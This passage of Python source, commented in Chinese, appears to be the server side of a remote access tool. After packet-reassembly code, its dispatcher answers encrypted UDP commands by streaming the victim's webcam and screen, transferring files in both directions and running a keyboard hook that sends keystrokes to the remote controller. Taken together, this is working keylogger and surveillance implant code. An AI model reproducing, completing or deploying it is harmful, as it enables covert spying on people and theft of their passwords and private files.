                    for i in range(start, end):
                        times = 3
                        print ("i=" + str(i))
                        # 接收数据，超时接收下一个包，套接字错误则说明客户端已断开连接，退出
                        while (True):
                            try:
                                pack = client_dict[Addr][1].get(True,1)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                pack=pack[2:]
                            except:
                                print("data get error.")
                                return
                            # 将序号和数据分离，按序存入字典
                            ID = pack[:pack.find("|")]

                            if int(ID)>=start and int(ID)<end:
                                data = pack[pack.find("|") + 1:]
                                data_dict[int(ID)] = data
                                print ("ID " + str(ID) + "get")
                            else:
                                print ("not in ID " + str(ID) + "get")
                            break

                # 若缺包序列不为空，说明有缺包情况，需要进行接收重发包
                else:
                    for i in request_list:
                        # 依次接收数据包
                        while (True):
                            try:
                                pack = client_dict[Addr][1].get(True,1)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                pack=pack[2:]
                                # 将序号和数据分离，存入字典
                                ID = pack[:pack.find("|")]
                                if int(ID) >= start and int(ID) < end:
                                    data = pack[pack.find("|") + 1:]
                                    print ("re ID " + str(ID) + "get")
                                    data_dict[int(ID)] = data
                                break
                            except :
                                print("reget data error.")
                                return
                print ("Check.")
                flag = True
                # 每组包进行校验
                for i in range(start, end):
                    if i not in data_dict.keys():
                        print ("%d lost" % i)
                        # 发现缺包，标志位置false，并且将序列号添加至缺包序列中
                        flag = False
                        if i not in request_list:
                            request_list.append(i)

                # 根据标志位判断有无缺包
                if (flag):
                    # 无缺包，说明该组收到的包是完整的，发送finish指令进行确认
                    print "finish."
                    finish="2|finish"
                    finish=str16add(finish)
                    finish=static_AES.encrypt(finish)
                    sock.sendto(finish, Addr)

                    # 按序写入文件
                    for i in range(start, end):
                        try:
                            fp.write(data_dict[i])
                        except KeyError:
                            print ("Key error.")
                            print ("Start=%d,end=%d" % (start, end))
                            print data_dict.keys()
                            return
                    # 若末尾包序等于总包数，则说明整个文件接收完毕
                    if end == count:
                        for i in range(start,end):
                            if len(data_dict[i])==0:
                                print "Dict["+str(i)+"] is NULL"
                        print ("All finish.")
                        start=0
                        end=start+group_len
                        return
                    # 其它情况则移动首位包序位
                    start += group_len
                    end += group_len
                    # 清空数据字典和缺包序列着两个临时数据区
                    data_dict = {}
                    request_list = []
                # 有缺包情况，发送缺包序列
                else:
                    request="3|"+str(request_list)
                    request=str16add(request)
                    request=static_AES.encrypt(request)
                    sock.sendto(request, Addr)

    def stopSend(self):
        self.sendFlag=False

    def stopRec(self):
        self.recFlag=False

def check_thread():
    while(True):
        for name in client_dict.keys():
            if client_dict[name][2].isAlive():
                pass
            else:
                print str(name)+"is exit."
                client_dict.pop(name)
        print("the client is: "),
        print client_dict.keys()
        time.sleep(5)


def server_process():
    global client_dict
    IP_PORT = ('0.0.0.0', 9999)
    server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0) #服务端设置为UDP类型的socket
    #允许端口复用
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    server.setblocking(False) #设置为非阻塞模式
    server.bind(IP_PORT)  #绑定端口
    #server.settimeout(time_out)
    print("Server is working...")
    keyhook=Keyhook()
    keyhook.__int__(server)
    camera=Camera()
    screen=Screen()
    file=File()
    #启动线程监控
    t=threading.Thread(target=check_thread)
    t.start()
    k_h=threading.Thread(target=keyhook.start)
    k_h.start()
    while (True):
        Data=""
        try:
            Data,ClientAddr = server.recvfrom(65535) #接收命令
            time_now = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) #获取当前时间
            #print("%s  %s:%s  %s" % (time_now, ClientAddr[0], ClientAddr[1], Data))#输出命令
        except:
            continue
        #判断命令类型
        if(len(Data)!=0):
            #server.sendto("OK", ClientAddr)
            #client_dict={client_addr:[lock,queue,event]}
            if ClientAddr not in client_dict.keys():
                #print Data
                Data=static_AES.decrypt(Data)
                Data = str16del(Data)
                if Data in command_list:
                    client_list=[]
                    lock = Lock()
                    queue=Queue(10000)
                    #event=Event()
                    client_list.append(lock)
                    client_list.append(queue)
                    #client_list.append(event)
                    client_dict[ClientAddr]=client_list
                    #lock.acquire()
                    #queue.put(Data)
                    #lock.release()
                    print "cd="+str(client_dict)
                if Data=="test":
                    print"start testing"
                    t = threading.Thread(target=out_put, args=(ClientAddr,), name=Data)
                    t.start()
                if Data=="getVideo":
                    t = threading.Thread(target=camera.start, args=(server, ClientAddr), name=Data)
                    client_dict[ClientAddr].append(t)
                    t.start()
                if Data=="getSVideo":
                    t = threading.Thread(target=screen.start, args=(server, ClientAddr), name=Data)
                    client_dict[ClientAddr].append(t)
                    t.start()
                if Data=="getFile":
                    t = threading.Thread(target=file.send_im, args=(server, ClientAddr), name=Data)
                    client_dict[ClientAddr].append(t)
                    t.start()
                if Data=="sendFile":
                    t = threading.Thread(target=file.receive_im, args=(server, ClientAddr), name=Data)
                    client_dict[ClientAddr].append(t)
                    t.start()
                if Data=="connect":
                    try:
                        server.sendto("OK",ClientAddr)
                    except:
                        pass
                if(Data=="download stop"):
                    t=threading.Thread(target=file.stop_send,args=())
                    client_dict[ClientAddr].append(t)
                    t.start()
                if Data=="keyHook":
                    if k_h.isAlive():
                        client_dict[ClientAddr].append(k_h)
                        keyhook.setAddr(ClientAddr)
                        keyhook.run()
                    else:
                        k_h = threading.Thread(target=keyhook.start)
                        k_h.start()
                        client_dict[ClientAddr].append(k_h)
                        keyhook.setAddr(ClientAddr)
                        keyhook.run()
            else:

                client_dict[ClientAddr][0].acquire()
                client_dict[ClientAddr][1].put(Data)
                client_dict[ClientAddr][0].release()




if __name__=='__main__':
    server_process()

